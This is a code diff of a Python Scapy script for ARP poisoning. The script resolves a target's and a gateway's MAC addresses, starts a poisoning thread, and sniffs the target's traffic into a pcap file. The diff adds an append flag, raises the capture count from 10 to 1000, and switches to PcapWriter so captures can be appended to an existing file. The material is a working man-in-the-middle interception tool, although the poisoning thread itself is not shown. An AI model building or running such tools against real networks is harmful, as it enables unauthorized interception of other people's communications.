@@ -5,12 +5,13 @@ import threading
 import os
 import signal
 
-opts,args=getopt.getopt(sys.argv[1:],'h',['target=','gateway=','interface','help'])
+opts,args=getopt.getopt(sys.argv[1:],'a',['append','target=','gateway=','interface=','help'])
 target_ip='0.0.0.0'
 gateway_ip='0.0.0.0'
 target_mac='ff:ff:ff:ff:ff:ff'
 gateway_mac='ff:ff:ff:ff:ff:ff'
 interface='eth0'
+append=False
 for opt,value in opts:
     if(opt=='--target'):
         target_ip=value
@@ -18,21 +19,28 @@ for opt,value in opts:
         gateway_ip=value
     elif(opt=='--interface'):
         interface=value
+    elif(opt=='-a'):
+        append=True
 #print target_ip,gateway_ip,interface
 conf.iface=interface
 conf.verb=0
 print "start arp poison"
 
 def main():
-    global target_ip,gateway_ip,target_mac,gateway_mac
+    global target_ip,gateway_ip,target_mac,gateway_mac,append
     gateway_mac=getMac(gateway_ip)
     target_mac=getMac(target_ip)
     poison_thread=Poison_Thread()
     poison_thread.start()
-    packet_count=10
+    packet_count=1000
     fil="ip host %s" % target_ip
     packets=sniff(count=packet_count,filter=fil,iface=interface)
-    wrpcap('arper.pcap',packets)
+    #wrpcap('arper.pcap',packets)
+    writer=PcapWriter('arper.pcap',append=append)
+    for p in packets:
+        writer.write(p)
+    writer.flush()
+    writer.close()
     poison_thread.stop()
     poison_thread.join()
 
